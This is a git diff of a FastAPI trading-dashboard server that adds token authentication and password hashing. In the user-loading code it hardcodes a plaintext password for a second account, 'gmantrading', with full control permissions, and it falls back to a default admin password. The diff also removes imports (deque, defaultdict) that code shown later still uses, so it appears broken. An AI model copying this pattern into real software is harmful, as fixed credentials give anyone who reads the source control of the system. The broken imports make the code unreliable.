@@ -16,12 +16,11 @@ from fastapi.middleware.cors import CORSMiddleware
 from datetime import datetime, timezone, timedelta
 from typing import Optional, Dict, List, Set
 import asyncio
+import base64
+import hashlib
+import hmac
 import json
-import time
 import logging
-from collections import defaultdict, deque
-from pydantic import BaseModel
-import uuid
 import os
 import glob
 import subprocess
@@ -58,8 +57,158 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Global state with enhanced tracking
-STATE = {
+if DASHBOARD_DIR.exists():
+    app.mount("/static", StaticFiles(directory=str(DASHBOARD_DIR)), name="static")
+
+security = HTTPBearer(auto_error=False)
+
+
+def _urlsafe_b64encode(data: bytes) -> str:
+    return base64.urlsafe_b64encode(data).decode("ascii").rstrip("=")
+
+
+def _urlsafe_b64decode(data: str) -> bytes:
+    padding = "=" * (-len(data) % 4)
+    return base64.urlsafe_b64decode(data + padding)
+
+
+def load_secret_key() -> bytes:
+    if SECRET_FILE.exists():
+        return SECRET_FILE.read_bytes()
+    key = secrets.token_bytes(32)
+    SECRET_FILE.write_bytes(key)
+    return key
+
+
+SECRET_KEY = load_secret_key()
+
+
+def _write_json(path: Path, payload: Dict[str, Any]) -> None:
+    path.write_text(json.dumps(payload, indent=2))
+
+
+def load_settings() -> Dict[str, Any]:
+    try:
+        if SETTINGS_FILE.exists():
+            stored = json.loads(SETTINGS_FILE.read_text())
+            if isinstance(stored, dict):
+                return {**DEFAULT_SETTINGS, **stored}
+    except Exception as exc:
+        logger.warning("Failed to load settings fallback to defaults: %s", exc)
+    return dict(DEFAULT_SETTINGS)
+
+
+def save_settings(settings: Dict[str, Any]) -> None:
+    try:
+        _write_json(SETTINGS_FILE, settings)
+    except Exception as exc:
+        logger.error("Failed to persist settings: %s", exc)
+
+
+def create_user_record(username: str, password: str, permissions: List[str]) -> Dict[str, Any]:
+    salt = secrets.token_bytes(16)
+    digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, PBKDF2_ITERATIONS)
+    return {
+        "username": username,
+        "salt": _urlsafe_b64encode(salt),
+        "hash": _urlsafe_b64encode(digest),
+        "iterations": PBKDF2_ITERATIONS,
+        "permissions": permissions,
+        "created_at": datetime.now(timezone.utc).isoformat(),
+    }
+
+
+def load_users() -> Dict[str, Any]:
+    payload: Dict[str, Any] = {}
+    if USERS_FILE.exists():
+        try:
+            loaded = json.loads(USERS_FILE.read_text())
+            if isinstance(loaded, dict):
+                payload = loaded
+        except Exception as exc:
+            logger.error("User database unreadable, recreating: %s", exc)
+    changed = False
+    fallback_password = os.getenv("APP_ADMIN_PASSWORD", "change-me-now!")
+    if "admin" not in payload:
+        if fallback_password == "change-me-now!":
+            logger.warning("Default admin password in use; set APP_ADMIN_PASSWORD for production.")
+        payload["admin"] = create_user_record("admin", fallback_password, ["read", "write", "control"])
+        changed = True
+    if "gmantrading" not in payload:
+        payload["gmantrading"] = create_user_record(
+            "gmantrading",
+            "kingdombuilder26$$",
+            ["read", "write", "control"],
+        )
+        changed = True
+    if changed or not payload:
+        _write_json(USERS_FILE, payload)
+    return payload
+
+
+USERS: Dict[str, Dict[str, Any]] = load_users()
+
+
+def verify_password(password: str, user_record: Dict[str, Any]) -> bool:
+    try:
+        salt = _urlsafe_b64decode(user_record["salt"])
+        expected = _urlsafe_b64decode(user_record["hash"])
+        iterations = int(user_record.get("iterations") or PBKDF2_ITERATIONS)
+        digest = hashlib.pbkdf2_hmac("sha256", password.encode("utf-8"), salt, iterations)
+        return hmac.compare_digest(digest, expected)
+    except Exception as exc:
+        logger.error("Password verification failed: %s", exc)
+        return False
+
+
+def create_access_token(username: str, minutes: int = ACCESS_TOKEN_MINUTES) -> str:
+    payload = {
+        "sub": username,
+        "exp": int((datetime.now(timezone.utc) + timedelta(minutes=minutes)).timestamp()),
+    }
+    body = _urlsafe_b64encode(json.dumps(payload, separators=(",", ":"), sort_keys=True).encode("utf-8"))
+    signature = _urlsafe_b64encode(hmac.new(SECRET_KEY, body.encode("ascii"), hashlib.sha256).digest())
+    return f"{body}.{signature}"
+
+
+def decode_access_token(token: str) -> Dict[str, Any]:
+    try:
+        body, signature = token.split(".", 1)
+        expected_sig = _urlsafe_b64encode(hmac.new(SECRET_KEY, body.encode("ascii"), hashlib.sha256).digest())
+        if not hmac.compare_digest(signature, expected_sig):
+            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid token signature")
+        payload = json.loads(_urlsafe_b64decode(body))
+        expiry = int(payload["exp"])
+        if expiry < int(datetime.now(timezone.utc).timestamp()):
+            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Token expired")
+        return payload
+    except HTTPException:
+        raise
+    except Exception:
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Invalid token format")
+
+
+async def get_current_user(credentials: Optional[HTTPAuthorizationCredentials] = Depends(security)):
+    if not credentials:
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Authentication required")
+    payload = decode_access_token(credentials.credentials)
+    username = payload.get("sub")
+    user_record = USERS.get(username or "")
+    if not user_record:
+        raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Unknown user")
+    return user_record
+
+
+def require_permission(permission: str):
+    async def wrapper(user=Depends(get_current_user)):
+        if permission not in user.get("permissions", []):
+            raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail=f"Permission '{permission}' required")
+        return user
+
+    return wrapper
+
+
+STATE: Dict[str, Any] = {
     "running": False,
     "metrics": {
         "equity": 100000,
@@ -147,7 +296,7 @@ def _read_json(path: Path):
 
 # Connection and rate limiting tracking
 class ConnectionManager:
-    def __init__(self):
+    def __init__(self) -> None:
         self.active_connections: List[WebSocket] = []
         self.connection_info: Dict[WebSocket, dict] = {}
         self.rate_limiter: Dict[str, deque] = defaultdict(lambda: deque())
